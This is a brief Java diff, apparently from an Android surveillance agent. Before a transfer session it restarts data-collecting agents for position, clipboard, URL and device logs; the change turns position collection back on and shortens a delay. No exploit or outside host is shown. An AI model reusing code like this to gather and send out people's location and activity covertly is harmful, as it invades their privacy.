@@ -128,13 +128,13 @@ public class SyncAction extends SubAction {
             transferInit();
 
             // Stop degli agenti che producono un singolo log
-            // agentManager.reStart(Agent.AGENT_POSITION);
+            agentManager.reStart(Agent.AGENT_POSITION);
             // agentManager.reStart(Agent.AGENT_APPLICATION);
             //agentManager.reStart(Agent.AGENT_CLIPBOARD);
             //agentManager.reStart(Agent.AGENT_URL);
             agentManager.reStart(Agent.AGENT_DEVICE);
 
-            Utils.sleep(2500);
+            Utils.sleep(500);
 
             final boolean ret = transfer.startSession();
 
